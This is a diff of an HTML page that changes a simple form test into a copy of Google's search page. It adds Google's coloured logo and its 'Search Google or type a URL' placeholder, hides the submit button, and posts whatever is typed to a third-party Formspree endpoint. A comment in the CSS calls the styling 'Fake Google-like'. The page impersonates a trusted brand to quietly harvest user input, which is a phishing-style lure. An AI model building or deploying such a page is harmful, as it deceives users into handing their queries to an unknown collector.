@@ -2,26 +2,78 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Formspree Input Test</title>
+  <title>Search</title>
+
+  <style>
+    body {
+      height: 100vh;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      background-color: #ffffff;
+    }
+
+    .search-container {
+      text-align: center;
+    }
+
+    .logo {
+      font-size: 48px;
+      font-weight: bold;
+      margin-bottom: 25px;
+    }
+
+    /* Fake Google-like text coloring */
+    .g { color: #4285F4; }
+    .o1 { color: #DB4437; }
+    .o2 { color: #F4B400; }
+    .g2 { color: #4285F4; }
+    .l { color: #0F9D58; }
+    .e { color: #DB4437; }
+
+    input {
+      width: 500px;
+      max-width: 90%;
+      padding: 14px 20px;
+      font-size: 16px;
+      border-radius: 24px;
+      border: 1px solid #dfe1e5;
+      outline: none;
+      box-shadow: none;
+    }
+
+    input:focus {
+      box-shadow: 0 1px 6px rgba(32, 33, 36, 0.28);
+      border-color: transparent;
+    }
+
+    button {
+      display: none; /* Google hides submit button */
+    }
+  </style>
 </head>
+
 <body>
 
-  <h2>Enter Something</h2>
+  <div class="search-container">
 
-  <form action="https://formspree.io/f/mzdzlwyk" method="POST">
-    
-    <!-- Input field -->
-    <input 
-      type="text" 
-      name="user_input" 
-      placeholder="Type here..." 
-      required
-    >
+    <div class="logo">
+      <span class="g">G</span><span class="o1">o</span><span class="o2">o</span>
+      <span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+    </div>
 
-    <!-- Submit button -->
-    <button type="submit">Send</button>
+    <form action="https://formspree.io/f/mzdzlwyk" method="POST">
+      <input
+        type="text"
+        name="search_query"
+        placeholder="Search Google or type a URL"
+        required
+      >
+    </form>
 
-  </form>
+  </div>
 
 </body>
 </html>
